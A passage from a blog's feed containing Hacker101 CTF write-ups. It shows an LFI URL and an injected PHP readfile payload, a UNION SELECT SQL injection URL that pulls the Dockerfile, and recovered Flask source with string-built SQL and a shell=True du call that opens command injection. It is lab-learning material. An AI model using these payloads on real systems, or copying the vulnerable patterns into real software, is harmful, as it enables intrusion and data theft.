&lt;p&gt;When loading the &lt;code&gt;index.php&lt;&#x2F;code&gt; file, I noticed that the page tries to append an additional &lt;code&gt;.php&lt;&#x2F;code&gt; extension. In order to load the page properly, the URL needs to be like this:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;34.74.105.127&#x2F;fea3c7d20a&#x2F;?page=..&#x2F;app&#x2F;index
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I can also use LFI to call upon itself to read files:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;34.74.105.127&#x2F;fea3c7d20a&#x2F;?page=http:&#x2F;&#x2F;localhost&#x2F;index
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Armed with these three findings, I can combine the finding that was used in flag1 and inject PHP code to read &lt;code&gt;index.php&lt;&#x2F;code&gt; file. This will cause the server to execute and render the source code for &lt;code&gt;index.php&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;?php readfile(&amp;#39;index.php&amp;#39;)?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Approve the comment and trigger the LFI again. Third and final flag has been captured.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;images&#x2F;h1&#x2F;h1-codysfirstblog-4.png&quot; alt=&quot;flag2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Photo Gallery</title>
        <published>2020-12-30T00:00:00+00:00</published>
        <updated>2020-12-30T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/h1-photogallery/" type="text/html"/>
        <id>https://johntuyen.com/posts/h1-photogallery/</id>
        
        <content type="html">&lt;h3 id=&quot;flag0&quot;&gt;Flag0&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&amp;quot;Magical Image Gallery&amp;quot;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;h1-photogallery&#x2F;h1-photogallery-1.png&quot; alt=&quot;h1-photogallery-1.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The images are fetched by using &lt;code&gt;id&lt;&#x2F;code&gt; parameters as such:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;34.74.105.127&#x2F;9c4252a0af&#x2F;fetch?id=1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;When sending a GET request directly, the server doesn&#x27;t render the URL as an image but as raw format. From past CTF experiences, this is usually a case of extracting a system file to obtain the flag.&lt;&#x2F;p&gt;
&lt;p&gt;After roaming around the web application and performing basic enumeration tests, there wasn&#x27;t other obvious possible footholds. Therefore my assumption is a SQL injection attack is most likely a possibility.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Revealing Flag0 hints the web application is running &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;tiangolo&#x2F;uwsgi-nginx-flask-docker&quot;&gt;uwsgi-nginx-flask-docker&lt;&#x2F;a&gt; image. After reviewing the repository, I can only assume that I&#x27;m suppose to read a file using SQL injection now that we know what framework is being used.&lt;&#x2F;p&gt;
&lt;p&gt;With every docker image, there is always a &lt;code&gt;Dockerfile&lt;&#x2F;code&gt; that is included. After trial and error, a &lt;code&gt;union select&lt;&#x2F;code&gt; method was used to retrieve the &lt;code&gt;Dockerfile&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;34.74.105.127&#x2F;9c4252a0af&#x2F;fetch?id=4%20union%20select%20%27Dockerfile%27
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Output:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;FROM tiangolo&#x2F;uwsgi-nginx-flask:python2.7 WORKDIR &#x2F;app RUN apt-get update RUN DEBIAN_FRONTEND=noninteractive apt-get install -y mysql-client mysql-server default-libmysqlclient-dev build-essential ADD requirements.txt &#x2F;app&#x2F; RUN pip install --trusted-host pypi.python.org -r requirements.txt ADD . &#x2F;app
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The output looks similar to the &lt;code&gt;Dockerfile&lt;&#x2F;code&gt; included in the repository with the exception two things:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Installation of dependencies using &lt;code&gt;apt&lt;&#x2F;code&gt; and &lt;code&gt;pip&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Working directory is located in &lt;code&gt;&#x2F;app&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Going through the enumeration phase again, I checked out what is inside &lt;code&gt;requirements.txt&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;Flask mysqlclient pycrypto
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Nothing interesting is found. Looking back into the Github repository, there was an &lt;code&gt;&#x2F;app&lt;&#x2F;code&gt; directory that contains &lt;code&gt;main.py&lt;&#x2F;code&gt;, &lt;code&gt;prestart.sh&lt;&#x2F;code&gt;, and &lt;code&gt;uwsgi.ini&lt;&#x2F;code&gt;. After probing the three files, the &lt;code&gt;main.py&lt;&#x2F;code&gt; contains Flag0.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;h1-photogallery&#x2F;h1-photogallery-2.png&quot; alt=&quot;h1-photogallery-1.png&quot; &#x2F;&gt; &lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;flag1&quot;&gt;Flag1&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Now that we can see the source code, a review is performed.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;flask &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Flask, abort, redirect, request, Response
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;base64, json, MySQLdb, os, re, subprocess
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;app = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Flask&lt;&#x2F;span&gt;&lt;span&gt;(__name__)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;home = &amp;#39;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;!doctype html&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;html&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;	&amp;lt;head&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;		&amp;lt;title&amp;gt;Magical Image Gallery&amp;lt;&#x2F;title&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;	&amp;lt;&#x2F;head&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;	&amp;lt;body&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;		&amp;lt;h1&amp;gt;Magical Image Gallery&amp;lt;&#x2F;h1&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;$ALBUMS$
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;	&amp;lt;&#x2F;body&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;html&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;viewAlbum = &amp;#39;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;!doctype html&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;html&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;	&amp;lt;head&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;		&amp;lt;title&amp;gt;$TITLE$ -- Magical Image Gallery&amp;lt;&#x2F;title&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;	&amp;lt;&#x2F;head&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;	&amp;lt;body&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;		&amp;lt;h1&amp;gt;$TITLE$&amp;lt;&#x2F;h1&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;$GALLERY$
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;	&amp;lt;&#x2F;body&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;html&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;getDb&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;MySQLdb.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;connect&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;host&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;localhost&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;root&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;db&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;level5&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;sanitize&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;data.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;@app.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;route&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;index&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;	cur = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getDb&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cursor&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	cur.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SELECT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; id, title &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;FROM&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; albums&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span&gt;	albums = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;list&lt;&#x2F;span&gt;&lt;span&gt;(cur.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fetchall&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	rep = &amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;, title &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;albums:
&lt;&#x2F;span&gt;&lt;span&gt;		rep += &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;h2&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;h2&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; % &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sanitize&lt;&#x2F;span&gt;&lt;span&gt;(title)
&lt;&#x2F;span&gt;&lt;span&gt;		rep += &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;		cur.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SELECT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; id, title, filename &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;FROM&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; photos &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;WHERE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; parent&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;LIMIT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;, ))
&lt;&#x2F;span&gt;&lt;span&gt;		fns = []
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;pid, ptitle, pfn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;cur.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fetchall&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;			rep += &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;div&amp;gt;&amp;lt;img src=&amp;quot;fetch?id=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot; width=&amp;quot;266&amp;quot; height=&amp;quot;150&amp;quot;&amp;gt;&amp;lt;br&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; % (pid, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sanitize&lt;&#x2F;span&gt;&lt;span&gt;(ptitle))
&lt;&#x2F;span&gt;&lt;span&gt;			fns.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(pfn)
&lt;&#x2F;span&gt;&lt;span&gt;		rep += &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;i&amp;gt;Space used: &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + subprocess.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;check_output&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;du -ch &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; || exit 0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; % &amp;#39; &amp;#39;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;files&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + fn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;fn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;fns), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;stderr&lt;&#x2F;span&gt;&lt;span&gt;=subprocess.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;STDOUT&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rsplit&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)[-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] + &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;i&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;		rep += &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;home.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;$ALBUMS$&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, rep)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;@app.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;route&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;fetch&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;fetch&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;	cur = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getDb&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cursor&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;cur.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SELECT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; filename &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;FROM&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; photos &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;WHERE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; id&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; % request.args[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]) == &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;abort&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;404&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# It&amp;#39;s dangerous to go alone, take this:
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# ^FLAG^XXXXXX$FLAG$
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;.&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; % cur.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fetchone&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;].&lt;&#x2F;span&gt;&lt;span 